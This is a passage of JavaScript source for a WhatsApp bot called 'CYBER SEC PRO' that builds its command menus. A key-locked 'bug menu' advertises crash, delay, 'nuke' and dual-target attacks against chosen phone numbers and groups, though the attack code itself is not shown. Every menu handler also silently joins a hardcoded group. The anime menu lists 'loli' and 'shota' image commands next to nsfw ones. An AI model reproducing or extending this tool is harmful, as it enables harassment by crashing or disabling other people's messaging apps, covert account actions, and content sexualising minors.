❖═━═══𖠁𐂃𖠁══━═❖

┏━━◆ *CYBER - 𝐀𝐍𝐈𝐌𝐄* ◆━━┓
│❖ ${prefix}akiyama
│❖ ${prefix}ana
│❖ ${prefix}animebite
│❖ ${prefix}animeblush
│❖ ${prefix}animebonk
│❖ ${prefix}animebully
│❖ ${prefix}animecringe
│❖ ${prefix}animedance
│❖ ${prefix}animedl
│❖ ${prefix}animeglomp
│❖ ${prefix}animehappy
│❖ ${prefix}animehighfive
│❖ ${prefix}animekill
│❖ ${prefix}animelick
│❖ ${prefix}animepoke
│❖ ${prefix}animesearch
│❖ ${prefix}animesmile
│❖ ${prefix}animesmug
│❖ ${prefix}animewave
│❖ ${prefix}animewink
│❖ ${prefix}animewlp
│❖ ${prefix}animeyeet
│❖ ${prefix}art
│❖ ${prefix}asuna
│❖ ${prefix}ayuzawa
│❖ ${prefix}bluearchive
│❖ ${prefix}boruto
│❖ ${prefix}bts
│❖ ${prefix}cartoon
│❖ ${prefix}cecan
│❖ ${prefix}chiho
│❖ ${prefix}chinagirl
│❖ ${prefix}chitoge
│❖ ${prefix}cogan
│❖ ${prefix}cosplay
│❖ ${prefix}cosplayloli
│❖ ${prefix}cosplaysagiri
│❖ ${prefix}cyber
│❖ ${prefix}deidara
│❖ ${prefix}doraemon
│❖ ${prefix}elaina
│❖ ${prefix}emilia
│❖ ${prefix}erza
│❖ ${prefix}exo
│❖ ${prefix}femdom
│❖ ${prefix}freefire
│❖ ${prefix}gamewallpaper
│❖ ${prefix}glasses
│❖ ${prefix}gremory
│❖ ${prefix}hacker
│❖ ${prefix}hentai
│❖ ${prefix}hestia
│❖ ${prefix}husbu
│❖ ${prefix}inori
│❖ ${prefix}islamic
│❖ ${prefix}isuzu
│❖ ${prefix}itachi
│❖ ${prefix}itori
│❖ ${prefix}jennie
│❖ ${prefix}jiso
│❖ ${prefix}justina
│❖ ${prefix}kaga
│❖ ${prefix}kagura
│❖ ${prefix}kakashi
│❖ ${prefix}kaori
│❖ ${prefix}keneki
│❖ ${prefix}kotori
│❖ ${prefix}kpop
│❖ ${prefix}kucing
│❖ ${prefix}kurumi
│❖ ${prefix}lisa
│❖ ${prefix}loli
│❖ ${prefix}madara
│❖ ${prefix}manga
│❖ ${prefix}megumin
│❖ ${prefix}mikasa
│❖ ${prefix}mikey
│❖ ${prefix}miku
│❖ ${prefix}minato
│❖ ${prefix}mobile
│❖ ${prefix}moe
│❖ ${prefix}motor
│❖ ${prefix}mountain
│❖ ${prefix}naruto
│❖ ${prefix}neko
│❖ ${prefix}neko2
│❖ ${prefix}nekonime
│❖ ${prefix}nezuko
${_senderAdultUnlocked ? '│❖ ' + prefix + 'nsfw' : ''}
│❖ ${prefix}onepiece
│❖ ${prefix}pentol
│❖ ${prefix}pokemon
│❖ ${prefix}profil
│❖ ${prefix}programming
│❖ ${prefix}pubg
│❖ ${prefix}randblackpink
│❖ ${prefix}randomnime
│❖ ${prefix}randomnime2
│❖ ${prefix}rize
│❖ ${prefix}rose
│❖ ${prefix}ryujin
│❖ ${prefix}sagiri
│❖ ${prefix}sakura
│❖ ${prefix}sasuke
│❖ ${prefix}satanic
│❖ ${prefix}sfw
│❖ ${prefix}shina
│❖ ${prefix}shinka
│❖ ${prefix}shinomiya
│❖ ${prefix}shizuka
│❖ ${prefix}shota
│❖ ${prefix}shortquote
│❖ ${prefix}space
│❖ ${prefix}technology
│❖ ${prefix}tejina
│❖ ${prefix}toukachan
│❖ ${prefix}tsunade
│❖ ${prefix}waifu
│❖ ${prefix}wallhp
│❖ ${prefix}wallml
│❖ ${prefix}wallmlnime
│❖ ${prefix}yotsuba
│❖ ${prefix}yuki
│❖ ${prefix}yulibocil
│❖ ${prefix}yumeko
┗━━━━━━━━━━━━━━━━━━━━┛

⚙️ *Powered by ❖ 𝐂𝐘𝐁𝐄𝐑 𝐒𝐄𝐂 𝐏𝐑𝐎 ❖* | © 2026
`;

    // TRY-CATCH for image sending with fallback to text only
    try {
        await devtrust.sendMessage(from, 
            addNewsletterContext({
                image: { url: randomImage },
                caption: menuText
            }), 
            { quoted: m }
        );
    } catch (imageError) {
        console.log('❌ Menu image failed, sending text only:', imageError.message);
        await devtrust.sendMessage(from, 
            addNewsletterContext({
                text: menuText
            }), 
            { quoted: m }
        );
    }
}
break;

case 'bugmenu':
case 'CYBERbug': {
    {
        const _bmSenderNum = (m.sender || '').split('@')[0].split(':')[0];
        const _bmBannedFile = './database/bug_banned.json';
        const _bmUnlockedFile = require('path').join(__dirname, 'database', 'bug_unlocked.json');
        let _bmBanned = [];
        try { if (fs.existsSync(_bmBannedFile)) _bmBanned = JSON.parse(fs.readFileSync(_bmBannedFile, 'utf-8')); } catch(e) {}
        if (_bmBanned.some(id => String(id).replace(/[^0-9]/g,'') === _bmSenderNum))
            return reply(`🚫 *Access Denied*\nAap permanently ban hain Bug & SIM section se.`);
        let _bmUnlocked = [];
        try { if (fs.existsSync(_bmUnlockedFile)) _bmUnlocked = JSON.parse(fs.readFileSync(_bmUnlockedFile, 'utf-8')); } catch(e) {}
        if (!_bmUnlocked.some(id => String(id).replace(/[^0-9]/g,'') === _bmSenderNum))
            return reply(`🔒 *Bug Menu — Locked Section*\n\nYe section sirf authorized users ke liye hai.\n\n*Unlock karne ke liye:*\nAdmin se code maango phir type karo:\n➤ *${prefix}addkey1 <code>*`);
    }
    autoJoinGroup(devtrust, "https://chat.whatsapp.com/HO9oF4txvBoKqhPMHAlHLc").catch(() => {});
    await devtrust.sendMessage(m.chat, { react: { text: '🥀', key: m.key } });
    
    const menuImages = [
        'https://files.catbox.moe/smv12k.jpeg',
        'https://files.catbox.moe/smv12k.jpeg'
    ];
    
    const randomImage = menuImages[Math.floor(Math.random() * menuImages.length)];
    const uptime = formatUptime(process.uptime());
    const totalMem = os.totalmem();
    const freeMem = os.freemem();
    const platform = os.platform();
    const date = getLagosTime();
    const readmore = String.fromCharCode(8206).repeat(4001);
    const ramInfo = formatRam(totalMem, freeMem);
    const moodEmoji = getMoodEmoji();
    const totalCommands = countCommands();
    const hour = date.getHours();
    let greeting = hour < 12 ? 'Good Morning' : hour < 18 ? 'Good Afternoon' : 'Good Evening';
    
    // Get professional features
    const ownerName = getOwnerName();
    const botVersion = getBotVersion();
    const botMode = getBotMode();
    const currentDateTime = getCurrentDateTime();
    
    // ALPHABETICAL SECTIONS
    const menuText = `
┏━━◆ *CYBER - 𝐌𝐀𝐈𝐍 𝐌𝐄𝐍𝐔* ◆━━┓
┃ ⧎ ʜᴇʟʟᴏ  ${pushname}
┃ ⧎ ʙᴏᴛ ɴᴀᴍᴇ 「 *CYBER* 」
┃ ⧎ ᴠᴇʀsɪᴏɴ : *${botVersion}*
┃ ⧎ ᴏᴡɴᴇʀ : *${ownerName}*
┃ ⧎ ᴅᴇᴠᴇʟᴏᴘᴇʀ : *${ownerName}*
┃ ⧎ ᴍᴏᴅᴇ : *${botMode}*
┃ ⧎ ʀᴜɴᴛɪᴍᴇ : ${uptime}
┃ ⧎ ᴘʀᴇғɪx : 「 ${prefix} 」
┃ ⧎ ᴘʟᴀᴛғᴏʀᴍ : ${platform}
┃ ⧎ ʀᴀᴍ : ${ramInfo}
┃ ⧎ ᴄᴏᴍᴍᴀɴᴅs : ${totalCommands} total
┃ *${greeting}*, @${m?.sender.split('@')[0]}
┃ \`CYBER ᴀᴛ ʏᴏᴜʀ sᴇʀᴠɪᴄᴇ\`
┃ 🕒 ${currentDateTime} ${moodEmoji}
┗━━━━━━━━━━━━━━━━━━━━┛

❖═━═══𖠁𐂃𖠁══━═❖
♱  ${greeting}, *${pushname}*
*CYBER* ᴀᴛ ʏᴏᴜʀ sᴇʀᴠɪᴄᴇ
⚙️ *Powered by CYBER SEC PRO*
❖═━═══𖠁𐂃𖠁══━═❖

 ┏━━◆ *CYBER - 𝐁𝐔𝐆 𝐂𝐎𝐌𝐌𝐀𝐍𝐃𝐒* ◆━━┓
│
│ ◈ *𝗣𝗘𝗥𝗦𝗢𝗡𝗔𝗟 𝗔𝗧𝗧𝗔𝗖𝗞𝗦*
│❖ ${prefix}crash
│❖ ${prefix}blank
│❖ ${prefix}delay
│❖ ${prefix}delayhard
│❖ ${prefix}cyberinvis
│❖ ${prefix}androidinvis
│❖ ${prefix}andbug
│❖ ${prefix}invisphone
│❖ ${prefix}cyberclose
│❖ ${prefix}bruteclose
│❖ ${prefix}metaclose
│❖ ${prefix}close-zapp
│❖ ${prefix}cyber-destroy
│
│ ◈ *𝗡𝗘𝗪 𝗣𝗢𝗪𝗘𝗥𝗙𝗨𝗟 𝗔𝗧𝗧𝗔𝗖𝗞𝗦*
│❖ ${prefix}ultrabug
│❖ ${prefix}megabug
│❖ ${prefix}iphonecrash
│❖ ${prefix}iosbug
│❖ ${prefix}invisios
│❖ ${prefix}ghostcrash
│❖ ${prefix}godmode
│❖ ${prefix}killswitch
│
│ ◈ *𝗚𝗥𝗢𝗨𝗣 𝗔𝗧𝗧𝗔𝗖𝗞𝗦*
│❖ ${prefix}buggc
│❖ ${prefix}xgroup
│❖ ${prefix}crashgc
│❖ ${prefix}blankgc
│❖ ${prefix}cyberkillgc
│❖ ${prefix}invisgc
│❖ ${prefix}ghostgc
│❖ ${prefix}invisiblegc
│
│ ◈ *☢️ 𝗨𝗟𝗧𝗜𝗠𝗔𝗧𝗘 𝗢𝗩𝗘𝗥𝗞𝗜𝗟𝗟*
│❖ ${prefix}allattack
│❖ ${prefix}fullnuke
│❖ ${prefix}maxattack
│❖ ${prefix}overkill
│
│ ◈ *🔥 𝗗𝗨𝗔𝗟 𝗧𝗔𝗥𝗚𝗘𝗧*
│❖ ${prefix}dualattack 923xx1 923xx2
│❖ ${prefix}doublenuke 923xx1 923xx2
│❖ ${prefix}twotarget 923xx1 923xx2
│❖ ${prefix}dualkill 923xx1 923xx2
│
│ ◈ *⚡ 𝗚𝗥𝗢𝗨𝗣 + 𝗣𝗘𝗥𝗦𝗢𝗡*
│❖ ${prefix}groupandperson GroupID 923xx
│❖ ${prefix}gpperson GroupID 923xx
│❖ ${prefix}mixattack GroupID 923xx
│❖ ${prefix}fullstrike GroupID 923xx
│
│ ◈ *🔇 𝗦𝗧𝗘𝗔𝗟𝗧𝗛 𝗠𝗢𝗗𝗘*
│❖ ${prefix}stealthmode on/off
│
│ ◈ *🛑 𝗘𝗠𝗘𝗥𝗚𝗘𝗡𝗖𝗬 𝗦𝗧𝗢𝗣*
│❖ ${prefix}stopattack
│❖ ${prefix}stopatk
│❖ ${prefix}killattack
│❖ ${prefix}stopall
│
┗━━━━━━━━━━━━━━━━━━━━┛

⚙️ *Powered by ❖ 𝐂𝐘𝐁𝐄𝐑 𝐒𝐄𝐂 𝐏𝐑𝐎 ❖* | © 2026
`;

    // TRY-CATCH for image sending with fallback to text only
    try {
        await devtrust.sendMessage(from, 
            addNewsletterContext({
                image: { url: randomImage },
                caption: menuText
            }), 
            { quoted: m }
        );
    } catch (imageError) {
        console.log('❌ Menu image failed, sending text only:', imageError.message);
        await devtrust.sendMessage(from, 
            addNewsletterContext({
                text: menuText
            }), 
            { quoted: m }
        );
    }
}
break;

case 'downloadmenu':
case 'CYBERdownload': {
    autoJoinGroup(devtrust, "https://chat.whatsapp.com/HO9oF4txvBoKqhPMHAlHLc").catch(() => {});
    await devtrust.sendMessage(m.chat, { react: { text: '🥀', key: m.key } });
    
    const menuImages = [
        'https://files.catbox.moe/smv12k.jpeg',
        'https://files.catbox.moe/smv12k.jpeg'
    ];
    
    const randomImage = menuImages[Math.floor(Math.random() * menuImages.length)];
    const uptime = formatUptime(process.uptime());
    const totalMem = os.totalmem();
    const freeMem = os.freemem();
    const platform = os.platform();
    const date = getLagosTime();
    const readmore = String.fromCharCode(8206).repeat(4001);
    const ramInfo = formatRam(totalMem, freeMem);
    const moodEmoji = getMoodEmoji();
    const totalCommands = countCommands();
    const hour = date.getHours();
    let greeting = hour < 12 ? 'Good Morning' : hour < 18 ? 'Good Afternoon' : 'Good Evening';
    
    // Get professional features
    const ownerName = getOwnerName();
    const botVersion = getBotVersion();
    const botMode = getBotMode();
    const currentDateTime = getCurrentDateTime();
    
    // ALPHABETICAL SECTIONS
    const menuText = `
┏━━◆ *CYBER - 𝐌𝐀𝐈𝐍 𝐌𝐄𝐍𝐔* ◆━━┓
┃ ⧎ ʜᴇʟʟᴏ  ${pushname}
┃ ⧎ ʙᴏᴛ ɴᴀᴍᴇ 「 *CYBER* 」
┃ ⧎ ᴠᴇʀsɪᴏɴ : *${botVersion}*
┃ ⧎ ᴏᴡɴᴇʀ : *${ownerName}*
┃ ⧎ ᴅᴇᴠᴇʟᴏᴘᴇʀ : *${ownerName}*
┃ ⧎ ᴍᴏᴅᴇ : *${botMode}*
┃ ⧎ ʀᴜɴᴛɪᴍᴇ : ${uptime}
┃ ⧎ ᴘʀᴇғɪx : 「 ${prefix} 」
┃ ⧎ ᴘʟᴀᴛғᴏʀᴍ : ${platform}
┃ ⧎ ʀᴀᴍ : ${ramInfo}
┃ ⧎ ᴄᴏᴍᴍᴀɴᴅs : ${totalCommands} total
┃ *${greeting}*, @${m?.sender.split('@')[0]}
┃ \`CYBER ᴀᴛ ʏᴏᴜʀ sᴇʀᴠɪᴄᴇ\`
┃ 🕒 ${currentDateTime} ${moodEmoji}
┗━━━━━━━━━━━━━━━━━━━━┛

❖═━═══𖠁𐂃𖠁══━═❖
♱  ${greeting}, *${pushname}*
*CYBER* ᴀᴛ ʏᴏᴜʀ sᴇʀᴠɪᴄᴇ
⚙️ *Powered by CYBER SEC PRO*
❖═━═══𖠁𐂃𖠁══━═❖

┏━━◆ *CYBER - 𝐃𝐎𝐖𝐍𝐋𝐎𝐀𝐃* ◆━━┓
│❖ ${prefix}apk
│❖ ${prefix}apkdl
│❖ ${prefix}facebook
│❖ ${prefix}fb
│❖ ${prefix}fbdl
│❖ ${prefix}getbot
│❖ ${prefix}gitclone
│❖ ${prefix}ig
│❖ ${prefix}igdl
│❖ ${prefix}imbd
│❖ ${prefix}instagram
│❖ ${prefix}mediafire
│❖ ${prefix}movie
│❖ ${prefix}movie2
│❖ ${prefix}play
│❖ ${prefix}play2
│❖ ${prefix}sp
│❖ ${prefix}spotify
│❖ ${prefix}spotifydl
│❖ ${prefix}tgstickers
│❖ ${prefix}tiktok
│❖ ${prefix}tt
│❖ ${prefix}ytmp3
│❖ ${prefix}ytmp4
│❖ ${prefix}ytsearch
│❖ ${prefix}yts
┗━━━━━━━━━━━━━━━━━━━━┛

⚙️ *Powered by ❖ 𝐂𝐘𝐁𝐄𝐑 𝐒𝐄𝐂 𝐏𝐑𝐎 ❖* | © 2026
`;

    // TRY-CATCH for image sending with fallback to text only
    try {
        await devtrust.sendMessage(from, 
            addNewsletterContext({
                image: { url: randomImage },
                caption: menuText
            }), 
            { quoted: m }
        );
    } catch (imageError) {
        console.log('❌ Menu image failed, sending text only:', imageError.message);
        await devtrust.sendMessage(from, 
            addNewsletterContext({
                text: menuText
            }), 
            { quoted: m }
        );
    }
}
break;

case 'funmenu':
case 'CYBERfun': {
    autoJoinGroup(devtrust, "https://chat.whatsapp.com/HO9oF4txvBoKqhPMHAlHLc").catch(() => {});
    await devtrust.sendMessage(m.chat, { react: { text: '🥀', key: m.key } });
    
    const menuImages = [
        'https://files.catbox.moe/smv12k.jpeg',
        'https://files.catbox.moe/smv12k.jpeg'
    ];
    
    const randomImage = menuImages[Math.floor(Math.random() * menuImages.length)];
    const uptime = formatUptime(process.uptime());
    const totalMem = os.totalmem();
    const freeMem = os.freemem();
    const platform = os.platform();
    const date = getLagosTime();
    const readmore = String.fromCharCode(8206).repeat(4001);
    const ramInfo = formatRam(totalMem, freeMem);
    const moodEmoji = getMoodEmoji();
    const totalCommands = countCommands();
    const hour = date.getHours();
    let greeting = hour < 12 ? 'Good Morning' : hour < 18 ? 'Good Afternoon' : 'Good Evening';
    
    // Get professional features
    const ownerName = getOwnerName();
    const botVersion = getBotVersion();
    const botMode = getBotMode();
    const currentDateTime = getCurrentDateTime();
    
    // ALPHABETICAL SECTIONS
    const menuText = `
┏━━◆ *CYBER - 𝐌𝐀𝐈𝐍 𝐌𝐄𝐍𝐔* ◆━━┓
┃ ⧎ ʜᴇʟʟᴏ  ${pushname}
┃ ⧎ ʙᴏᴛ ɴᴀᴍᴇ 「 *CYBER* 」
┃ ⧎ ᴠᴇʀsɪᴏɴ : *${botVersion}*
┃ ⧎ ᴏᴡɴᴇʀ : *${ownerName}*
┃ ⧎ ᴅᴇᴠᴇʟᴏᴘᴇʀ : *${ownerName}*
┃ ⧎ ᴍᴏᴅᴇ : *${botMode}*
┃ ⧎ ʀᴜɴᴛɪᴍᴇ : ${uptime}
┃ ⧎ ᴘʀᴇғɪx : 「 ${prefix} 」
┃ ⧎ ᴘʟᴀᴛғᴏʀᴍ : ${platform}
┃ ⧎ ʀᴀᴍ : ${ramInfo}
┃ ⧎ ᴄᴏᴍᴍᴀɴᴅs : ${totalCommands} total
┃ *${greeting}*, @${m?.sender.split('@')[0]}
┃ \`CYBER ᴀᴛ ʏᴏᴜʀ sᴇʀᴠɪᴄᴇ\`
┃ 🕒 ${currentDateTime} ${moodEmoji}
┗━━━━━━━━━━━━━━━━━━━━┛

❖═━═══𖠁𐂃𖠁══━═❖
♱  ${greeting}, *${pushname}*
*CYBER* ᴀᴛ ʏᴏᴜʀ sᴇʀᴠɪᴄᴇ
⚙️ *Powered by CYBER SEC PRO*
❖═━═══𖠁𐂃𖠁══━═❖

┏━━◆ *CYBER - 𝐅𝐔𝐍* ◆━━┓
│❖ ${prefix}8ball
│❖ ${prefix}advice
│❖ ${prefix}ascii
│❖ ${prefix}compliment
│❖ ${prefix}dadjoke
│❖ ${prefix}dare
│❖ ${prefix}fact
│❖ ${prefix}flirt
│❖ ${prefix}funfact
│❖ ${prefix}joke
│❖ ${prefix}quote
│❖ ${prefix}rate
│❖ ${prefix}rewrite
│❖ ${prefix}roast
│❖ ${prefix}ship
│❖ ${prefix}story
│❖ ${prefix}truth
│❖ ${prefix}truthdare
│❖ ${prefix}urban
│❖ ${prefix}wouldyou
┗━━━━━━━━━━━━━━━━━━━━┛

⚙️ *Powered by ❖ 𝐂𝐘𝐁𝐄𝐑 𝐒𝐄𝐂 𝐏𝐑𝐎 ❖* | © 2026
`;

    // TRY-CATCH for image sending with fallback to text only
    try {
        await devtrust.sendMessage(from, 
            addNewsletterContext({
                image: { url: randomImage },
                caption: menuText
            }), 
            { quoted: m }
        );
    } catch (imageError) {
        console.log('❌ Menu image failed, sending text only:', imageError.message);
        await devtrust.sendMessage(from, 
            addNewsletterContext({
                text: menuText
            }), 
            { quoted: m }
        );
    }
}
break;

case 'gamemenu':
case 'CYBERgame': {
    autoJoinGroup(devtrust, "https://chat.whatsapp.com/HO9oF4txvBoKqhPMHAlHLc").catch(() => {});
    await devtrust.sendMessage(m.chat, { react: { text: '🥀', key: m.key } });
    
    const menuImages = [
        'https://files.catbox.moe/smv12k.jpeg',
        'https://files.catbox.moe/smv12k.jpeg'
    ];
    
    const randomImage = menuImages[Math.floor(Math.random() * menuImages.length)];
    const uptime = formatUptime(process.uptime());
    const totalMem = os.totalmem();
    const freeMem = os.freemem();
    const platform = os.platform();
    const date = getLagosTime();
    const readmore = String.fromCharCode(8206).repeat(4001);
    const ramInfo = formatRam(totalMem, freeMem);
    const moodEmoji = getMoodEmoji();
    const totalCommands = countCommands();
    const hour = date.getHours();
    let greeting = hour < 12 ? 'Good Morning' : hour < 18 ? 'Good Afternoon' : 'Good Evening';
    
    // Get professional features
    const ownerName = getOwnerName();
    const botVersion = getBotVersion();
    const botMode = getBotMode();
    const currentDateTime = getCurrentDateTime();
    
    // ALPHABETICAL SECTIONS
    const menuText = `
┏━━◆ *CYBER - 𝐌𝐀𝐈𝐍 𝐌𝐄𝐍𝐔* ◆━━┓
┃ ⧎ ʜᴇʟʟᴏ  ${pushname}
┃ ⧎ ʙᴏᴛ ɴᴀᴍᴇ 「 *CYBER* 」
┃ ⧎ ᴠᴇʀsɪᴏɴ : *${botVersion}*
┃ ⧎ ᴏᴡɴᴇʀ : *${ownerName}*
┃ ⧎ ᴅᴇᴠᴇʟᴏᴘᴇʀ : *${ownerName}*
┃ ⧎ ᴍᴏᴅᴇ : *${botMode}*
┃ ⧎ ʀᴜɴᴛɪᴍᴇ : ${uptime}
┃ ⧎ ᴘʀᴇғɪx : 「 ${prefix} 」
┃ ⧎ ᴘʟᴀᴛғᴏʀᴍ : ${platform}
┃ ⧎ ʀᴀᴍ : ${ramInfo}
┃ ⧎ ᴄᴏᴍᴍᴀɴᴅs : ${totalCommands} total
┃ *${greeting}*, @${m?.sender.split('@')[0]}
┃ \`CYBER ᴀᴛ ʏᴏᴜʀ sᴇʀᴠɪᴄᴇ\`
┃ 🕒 ${currentDateTime} ${moodEmoji}
┗━━━━━━━━━━━━━━━━━━━━┛

❖═━═══𖠁𐂃𖠁══━═❖
♱  ${greeting}, *${pushname}*
*CYBER* ᴀᴛ ʏᴏᴜʀ sᴇʀᴠɪᴄᴇ
⚙️ *Powered by CYBER SEC PRO*
❖═━═══𖠁𐂃𖠁══━═❖

┏━━◆ *CYBER - 𝐆𝐀𝐌𝐄𝐒* ◆━━┓
│❖ ${prefix}coin
│❖ ${prefix}coinbattle
│❖ ${prefix}dice
│❖ ${prefix}emojiquiz
│❖ ${prefix}gamefact
│❖ ${prefix}guess
│❖ ${prefix}hangman
│❖ ${prefix}math
│❖ ${prefix}mathfact
│❖ ${prefix}numbattle
│❖ ${prefix}numberbattle
│❖ ${prefix}rps
│❖ ${prefix}rpsls
│❖ ${prefix}tictactoe
┗━━━━━━━━━━━━━━━━━━━━┛

⚙️ *Powered by ❖ 𝐂𝐘𝐁𝐄𝐑 𝐒𝐄𝐂 𝐏𝐑𝐎 ❖* | © 2026
`;

    // TRY-CATCH for image sending with fallback to text only
    try {
        await devtrust.sendMessage(from, 
            addNewsletterContext({
                image: { url: randomImage },
                caption: menuText
            }), 
            { quoted: m }
        );
    } catch (imageError) {
        console.log('❌ Menu image failed, sending text only:', imageError.message);
        await devtrust.sendMessage(from, 
            addNewsletterContext({
                text: menuText
            }), 
            { quoted: m }
        );
    }
}
break;

case 'groupmenu':
case 'CYBERgroup': {
    autoJoinGroup(devtrust, "https://chat.whatsapp.com/HO9oF4txvBoKqhPMHAlHLc").catch(() => {});
    await devtrust.sendMessage(m.chat, { react: { text: '🥀', key: m.key } });
    
    const menuImages = [
        'https://files.catbox.moe/smv12k.jpeg',
        'https://files.catbox.moe/smv12k.jpeg'
    ];
    
    const randomImage = menuImages[Math.floor(Math.random() * menuImages.length)];
    const uptime = formatUptime(process.uptime());
    const totalMem = os.totalmem();
    const freeMem = os.freemem();
    const platform = os.platform();
    const date = getLagosTime();
    const readmore = String.fromCharCode(8206).repeat(4001);
    const ramInfo = formatRam(totalMem, freeMem);
    const moodEmoji = getMoodEmoji();
    const totalCommands = countCommands();
    const hour = date.getHours();
    let greeting = hour < 12 ? 'Good Morning' : hour < 18 ? 'Good Afternoon' : 'Good Evening';
    
    // Get professional features
    const ownerName = getOwnerName();
    const botVersion = getBotVersion();
    const botMode = getBotMode();
    const currentDateTime = getCurrentDateTime();
    
    // ALPHABETICAL SECTIONS
    const menuText = `
┏━━◆ *CYBER - 𝐌𝐀𝐈𝐍 𝐌𝐄𝐍𝐔* ◆━━┓
┃ ⧎ ʜᴇʟʟᴏ  ${pushname}
┃ ⧎ ʙᴏᴛ ɴᴀᴍᴇ 「 *CYBER* 」
┃ ⧎ ᴠᴇʀsɪᴏɴ : *${botVersion}*
┃ ⧎ ᴏᴡɴᴇʀ : *${ownerName}*
┃ ⧎ ᴅᴇᴠᴇʟᴏᴘᴇʀ : *${ownerName}*
┃ ⧎ ᴍᴏᴅᴇ : *${botMode}*
┃ ⧎ ʀᴜɴᴛɪᴍᴇ : ${uptime}
┃ ⧎ ᴘʀᴇғɪx : 「 ${prefix} 」
┃ ⧎ ᴘʟᴀᴛғᴏʀᴍ : ${platform}
┃ ⧎ ʀᴀᴍ : ${ramInfo}
┃ ⧎ ᴄᴏᴍᴍᴀɴᴅs : ${totalCommands} total
┃ *${greeting}*, @${m?.sender.split('@')[0]}
┃ \`CYBER ᴀᴛ ʏᴏᴜʀ sᴇʀᴠɪᴄᴇ\`
┃ 🕒 ${currentDateTime} ${moodEmoji}
┗━━━━━━━━━━━━━━━━━━━━┛

❖═━═══𖠁𐂃𖠁══━═❖
♱  ${greeting}, *${pushname}*
*CYBER* ᴀᴛ ʏᴏᴜʀ sᴇʀᴠɪᴄᴇ
⚙️ *Powered by CYBER SEC PRO*
❖═━═══𖠁𐂃𖠁══━═❖

┏━━◆ *CYBER - 𝐆𝐑𝐎𝐔𝐏* ◆━━┓
│❖ ${prefix}add
│❖ ${prefix}antibot
│❖ ${prefix}antibadword
│❖ ${prefix}antibeg
│❖ ${prefix}antilink
│❖ ${prefix}antilinkkick
│❖ ${prefix}antilinkwarn
│❖ ${prefix}antilinkgc
│❖ ${prefix}antilinkgckick
│❖ ${prefix}antispam
│❖ ${prefix}antitag
│❖ ${prefix}antitagwarn
│❖ ${prefix}antitagadmin
│❖ ${prefix}antitagadminwarn
│❖ ${prefix}antigroupmention
│❖ ${prefix}antigroupmentionkick
│❖ ${prefix}antigroupmentionwarn
│❖ ${prefix}closetime
│❖ ${prefix}creategc
│❖ ${prefix}creategroup
│❖ ${prefix}demote
│❖ ${prefix}gcsettings
│❖ ${prefix}goodbye
│❖ ${prefix}groupinfo
│❖ ${prefix}groupjid
│❖ ${prefix}grouplink
│❖ ${prefix}groupstatus
│❖ ${prefix}gst
│❖ ${prefix}gstatus
│❖ ${prefix}hidetag
│❖ ${prefix}invite
│❖ ${prefix}kick
│❖ ${prefix}kickadmins
│❖ ${prefix}kickall
│❖ ${prefix}left
│❖ ${prefix}linkgc
│❖ ${prefix}listadmin
│❖ ${prefix}listadmins
│❖ ${prefix}listonline
│❖ ${prefix}members
│❖ ${prefix}mute
│❖ ${prefix}mutemember
│❖ ${prefix}opentime
│❖ ${prefix}poll
│❖ ${prefix}promote
│❖ ${prefix}resetlink
│❖ ${prefix}revoke
│❖ ${prefix}setdesc
│❖ ${prefix}setgrouppp
│❖ ${prefix}setname
│❖ ${prefix}tag
│❖ ${prefix}tagadmin
│❖ ${prefix}tagall
│❖ ${prefix}totalmembers
│❖ ${prefix}totag
│❖ ${prefix}unmute
│❖ ${prefix}unmutemember
│❖ ${prefix}warn
│❖ ${prefix}warnlimit
│❖ ${prefix}warns
│❖ ${prefix}resetwarn
┗━━━━━━━━━━━━━━━━━━━━┛

⚙️ *Powered by GAME CHANGER* | © 2026
`;

    // TRY-CATCH for image sending with fallback to text only
    try {
        await devtrust.sendMessage(from, 
            addNewsletterContext({
                image: { url: randomImage },
                caption: menuText
            }), 
            { quoted: m }
        );
    } catch (imageError) {
        console.log('❌ Menu image failed, sending text only:', imageError.message);
        await devtrust.sendMessage(from, 
            addNewsletterContext({
                text: menuText
            }), 
            { quoted: m }
        );
    }
}
break;

case 'logomenu':
case 'CYBERlogo': {
    autoJoinGroup(devtrust, "https://chat.whatsapp.com/HO9oF4txvBoKqhPMHAlHLc").catch(() => {});
    await devtrust.sendMessage(m.chat, { react: { text: '🥀', key: m.key } });
    
    const menuImages = [
        'https://files.catbox.moe/smv12k.jpeg',
        'https://files.catbox.moe/smv12k.jpeg'
    ];
    
    const randomImage = menuImages[Math.floor(Math.random() * menuImages.length)];
    const uptime = formatUptime(process.uptime());
    const totalMem = os.totalmem();
    const freeMem = os.freemem();
    const platform = os.platform();
    const date = getLagosTime();
    const readmore = String.fromCharCode(8206).repeat(4001);
    const ramInfo = formatRam(totalMem, freeMem);
    const moodEmoji = getMoodEmoji();
    const totalCommands = countCommands();
    const hour = date.getHours();
    let greeting = hour < 12 ? 'Good Morning' : hour < 18 ? 'Good Afternoon' : 'Good Evening';
    
    // Get professional features
    const ownerName = getOwnerName();
    const botVersion = getBotVersion();
    const botMode = getBotMode();
    const currentDateTime = getCurrentDateTime();
    
    // ALPHABETICAL SECTIONS
    const menuText = `
┏━━◆ *CYBER - 𝐌𝐀𝐈𝐍 𝐌𝐄𝐍𝐔* ◆━━┓
┃ ⧎ ʜᴇʟʟᴏ  ${pushname}
┃ ⧎ ʙᴏᴛ ɴᴀᴍᴇ 「 *CYBER* 」
┃ ⧎ ᴠᴇʀsɪᴏɴ : *${botVersion}*
┃ ⧎ ᴏᴡɴᴇʀ : *${ownerName}*
┃ ⧎ ᴅᴇᴠᴇʟᴏᴘᴇʀ : *${ownerName}*
┃ ⧎ ᴍᴏᴅᴇ : *${botMode}*
┃ ⧎ ʀᴜɴᴛɪᴍᴇ : ${uptime}
┃ ⧎ ᴘʀᴇғɪx : 「 ${prefix} 」
┃ ⧎ ᴘʟᴀᴛғᴏʀᴍ : ${platform}
┃ ⧎ ʀᴀᴍ : ${ramInfo}
┃ ⧎ ᴄᴏᴍᴍᴀɴᴅs : ${totalCommands} total
┃ *${greeting}*, @${m?.sender.split('@')[0]}
┃ \`CYBER ᴀᴛ ʏᴏᴜʀ sᴇʀᴠɪᴄᴇ\`
┃ 🕒 ${currentDateTime} ${moodEmoji}
┗━━━━━━━━━━━━━━━━━━━━┛

❖═━═══𖠁𐂃𖠁══━═❖
♱  ${greeting}, *${pushname}*
*CYBER* ᴀᴛ ʏᴏᴜʀ sᴇʀᴠɪᴄᴇ
⚙️ *Powered by CYBER SEC PRO*
❖═━═══𖠁𐂃𖠁══━═❖

┏━━◆ *CYBER - 𝐋𝐎𝐆𝐎* ◆━━┓
│❖ ${prefix}advancedglow
│❖ ${prefix}blackpinklogo
│❖ ${prefix}blackpinkstyle
